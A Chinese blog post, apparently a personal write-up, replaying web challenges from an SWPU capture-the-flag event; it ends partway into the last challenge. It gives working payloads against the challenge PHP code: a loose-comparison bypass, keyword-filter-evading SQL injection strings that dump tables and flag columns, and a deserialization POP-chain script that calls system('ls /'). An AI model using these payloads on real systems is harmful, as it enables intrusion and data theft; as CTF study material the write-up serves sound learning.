@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="Funny_web这个题一开始就没做，不知道账号和密码算是他们内部题吧  然后进去之后看源码 1234567891011121314&lt;?php  error_reporting(0);  header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);  highlight_file(__FILE__);  include(&amp;#x27;fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SWPU未解题复现">
+<meta property="og:url" content="https://joker2763.github.io/undefined/43696.html">
+<meta property="og:site_name" content="Myblog">
+<meta property="og:description" content="Funny_web这个题一开始就没做，不知道账号和密码算是他们内部题吧  然后进去之后看源码 1234567891011121314&lt;?php  error_reporting(0);  header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);  highlight_file(__FILE__);  include(&amp;#x27;fl">
+<meta property="og:locale">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzm2WT.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzmWSU.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzmOSO.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzmqfK.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xznkp8.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzniff.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzn31U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xznGX4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzn8cF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xznbHs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuVC6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuA4x.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuTG6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzu7RK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuHxO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuqMD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzu5I1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuoPx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzu4aR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuWqJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzuhZ9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKHkn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKbYq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKqf0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKowj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKImQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzK4Og.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKh6S.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKfl8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/11/08/xzKTTs.png">
+<meta property="article:published_time" content="2022-11-08T13:10:37.000Z">
+<meta property="article:modified_time" content="2022-11-08T14:04:43.491Z">
+<meta property="article:author" content="Joker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/11/08/xzm2WT.md.png">
+
+
+<title >SWPU未解题复现</title>
+
+<!-- Favicon -->
+
+    <link href='/img/favicon.svg?v=v1.1.8' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/img/favicon.svg?v=v1.1.8' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/locomotive-scroll@4.1.4/dist/locomotive-scroll.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css">
+
+
+    
+
+    
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"joker2763.github.io","author":"Joker","root":"/","typed_text":["Web Developer","Web Dog"],"favicon":{"logo":"/img/favicon.svg","icon16":"/img/favicon.svg","icon32":"/img/favicon.svg","appleTouchIcon":null,"webmanifest":null,"visibilitychange":false,"hidden":"/failure.ico","showText":"(/≧▽≦/)咦！又好了！","hideText":"(●—●)喔哟，崩溃啦！"},"theme_version":"v1.1.8","theme":{"switch":true,"default":"style-light"},"search":{"enable":false,"type":"engine","href":"https://www.google.com/search?q=site:","domain":null},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated."},"creative_commons":{"license":"by-nc-sa","language":"deed.zh","post":false,"clipboard":false}};</script>
+
+<!-- Theme mode css -->
+
+    <link data-swup-theme="style-light" rel="stylesheet" href="/css/style-light.css?v=v1.1.8" id="trm-switch-style">
+    <link data-swup-theme="style-dark" rel="stylesheet" href="/css/style-dark.css?v=v1.1.8" id="trm-switch-style">
+    <script>
+        let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+        let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+        let themeMode = catchMode === 'style-dark' ? 'style-light' : 'style-dark';
+        let linkdom = document.querySelector('[data-swup-theme='+themeMode+']');
+        if(linkdom) linkdom.remove();
+    </script>
+
+
+<!-- CDN -->
+
+
+    
+
+    
+
+
+
+<!-- Site Analytics -->
+ 
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" data-scroll-container style="opacity: 0">
+          <div data-scroll-section id="content" class="trm-scroll-section">
+
+            <div class="locomotive-scroll__sticky-target" style=" position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none;"></div>
+
+            <!-- top bar -->
+            <header class="trm-top-bar" data-scroll data-scroll-sticky data-scroll-target=".locomotive-scroll__sticky-target" data-scroll-offset="-10">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+			<a href="/" class="trm-logo-frame trm-anima-link">
+				
+					<img src="/img/favicon.svg" alt="logo">
+				
+				
+			</a>
+			<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+
+			<!-- menu -->
+			<div class="trm-menu">
+				<nav>
+					<ul>
+						
+						<li class="menu-item-has-children ">
+							<a  href="/" target="">
+								Home
+							</a>
+							
+						</li>
+						
+						<li class="menu-item-has-children ">
+							<a  href="/archives/" target="">
+								Archives
+							</a>
+							
+						</li>
+						
+					</ul>
+				</nav>
+			</div>
+			<!-- menu end -->
+			
+			<!-- mode switcher place -->
+			
+			<div class="trm-mode-switcher-place">
+				<!-- <div class="trm-hidden-switcher"> -->
+					<div class="trm-mode-switcher">
+					  <i class="far fa-sun"></i>
+					  <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+					  <label class="trm-swich" for="trm-swich"></label>
+					  <i class="far fa-moon"></i>
+					</div>
+				  <!-- </div> -->
+			</div>
+			
+			<!-- mode switcher place end -->
+
+			 
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner" data-scroll data-scroll-direction="vertical">
+    
+    <!-- banner cover -->
+    <img src="https://s1.ax1x.com/2022/10/14/xwaMaF.jpg" alt="banner" class="trm-banner-cover" data-scroll data-scroll-direction="vertical" data-scroll-speed="-3">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container" data-scroll data-scroll-direction="vertical" data-scroll-speed="0">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            SWPU未解题复现
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        undefined
+                                    </span
+                                ></li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <a href="#about-triger" data-scroll-to="#about-triger" data-scroll-offset="-130" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </a>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card" data-scroll data-scroll-repeat data-scroll-sticky data-scroll-target=".locomotive-scroll__sticky-target" data-scroll-offset="60"> 
+    
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20"><img class="trm-avatar" src="/img/avatar.jpg" alt="Avatar"> </div>
+    <h5 class="trm-name trm-mb-15">
+        Joker
+    </h5>
+    
+    <div class="trm-label">
+        
+        <span class="trm-typed-text">
+            <!-- Words for theme.user.typedText -->
+        </span>
+    </div>
+    
+</div>
+<!-- card header end -->
+
+<!-- sidebar social -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+
+<div class="trm-social">
+    
+        <a href="https://github.com" title="Github" rel="nofollow" target="_blank">
+            <i class="fab fa-github"></i>
+        </a>
+    
+        <a href="https://twitter.com" title="Twitter" rel="nofollow" target="_blank">
+            <i class="fab fa-twitter"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+
+<!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                Residence:
+            </div>
+            <div class="trm-label trm-label-light">
+                Mars
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                music:
+            </div>
+            <div class="trm-label trm-label-light">
+                那是你离开了北京的生活
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                idol:
+            </div>
+            <div class="trm-label trm-label-light">
+                Joker xue
+            </div>
+        </li>
+    
+</ul>
+
+    
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="col-lg-8">
+                <div class="trm-content" id="trm-content">
+                    <div data-scroll data-scroll-repeat data-scroll-offset="500" id="about-triger"></div>
+
+                    <div class="row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="far fa-calendar-alt trm-icon"></i><br>
+            11/08
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="far fa-clock trm-icon"></i><br>
+            09:10
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="far fa-user trm-icon"></i><br>
+            Joker
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article class="trm-publication">
+    <h2 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h2><p>这个题一开始就没做，不知道账号和密码算是他们内部题吧</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xzm2WT"><img src="https://s1.ax1x.com/2022/11/08/xzm2WT.md.png" alt="xzm2WT.md.png" loading="lazy"></a></p>
+<p>然后进去之后看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这为何相等又不相等&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我卡了一下一直在纠结<code>intval</code>这个函数，但是这里其实不是考这个函数而是考PHP弱比较<br>所以payload：<code>?num=12345a</code><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzmWSU"><img src="https://s1.ax1x.com/2022/11/08/xzmWSU.md.png" alt="xzmWSU.md.png" loading="lazy"></a></p>
+<h2 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a>where_am_i</h2><p>这个题那张图片实在是没看清那个酒店叫啥名字<br>山水间古迹酒店百度地图找到<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzmOSO"><img src="https://s1.ax1x.com/2022/11/08/xzmOSO.md.png" alt="xzmOSO.md.png" loading="lazy"></a><br>输入客服电话去掉字符就行<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzmqfK"><img src="https://s1.ax1x.com/2022/11/08/xzmqfK.md.png" alt="xzmqfK.md.png" loading="lazy"></a></p>
+<h2 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h2><p>前面抓包发现1.js，然后有个NsScTf.php这些步骤先过当时不是卡在这里<br>进入NsScTf.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;  </span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>卡在这里，一开始看那个hint以为是用HEAD请求但不是<br>利用<code>call_user_func</code>函数，直接看payload：<code>?p=Nss::Ctf</code>用大写绕过正则匹配模式是m所以可以用大写绕过主要是这里可以用<code>::</code>来进入ctf这个函数<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xznkp8"><img src="https://s1.ax1x.com/2022/11/08/xznkp8.md.png" alt="xznkp8.md.png" loading="lazy"></a><br>提示nss2,同样的利用方法<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzniff"><img src="https://s1.ax1x.com/2022/11/08/xzniff.png" alt="xzniff.png" loading="lazy"></a><br>flag在源码</p>
+<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>这个题当时没做出来一开始没找到绕过方式，后面没做了</p>
+<p>用post传参 过滤了 <code>or 空格 union</code><br>爆表<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</code><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzn31U"><img src="https://s1.ax1x.com/2022/11/08/xzn31U.png" alt="xzn31U.png" loading="lazy"></a><br>爆列<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</code><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xznGX4"><img src="https://s1.ax1x.com/2022/11/08/xznGX4.png" alt="xznGX4.png" loading="lazy"></a><br>字段<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(Secr3t,flll444g)/**/from/**/NSS_tb%23</code><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzn8cF"><img src="https://s1.ax1x.com/2022/11/08/xzn8cF.png" alt="xzn8cF.png" loading="lazy"></a></p>
+<h2 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h2><p>这个pop链做的时候没看懂</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)  </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   <span class="title function_ invoke__">highlight_file</span>(__file__);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看fin类中的fmm()函数，<code>$b($this-&gt;title);</code>这一条语句如果b为system而title为ls &#x2F;,那么是不是就执行查看根目录，怎么进入这个函数呢？lt类中toString可以进入<code>return $this-&gt;impo-&gt;fmm();</code>那么怎么进入toString呢，当对象当作字符串输出时会进入toString方法，看__destruct()销毁对象时会输出这个对象，至此pop链就理清楚了，这里就进入toString有点难理解，其它还好，这个pop链是需要自己去构造危险函数的执行，以前没练过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;impo = <span class="variable">$f</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;  </span><br><span class="line">        <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);<span class="comment">//这里做命令执行  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;system&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;title = <span class="string">&quot;ls /&quot;</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>(<span class="variable">$a</span>);<span class="comment">//通过构造函数让this-&gt;impo为对象销毁时进入toString  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md51[]=<span class="number">1</span>;<span class="comment">//通过数组绕过MD5  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md52[] = <span class="number">2</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h2><p>之前没做过这种利用参数执行函数</p>
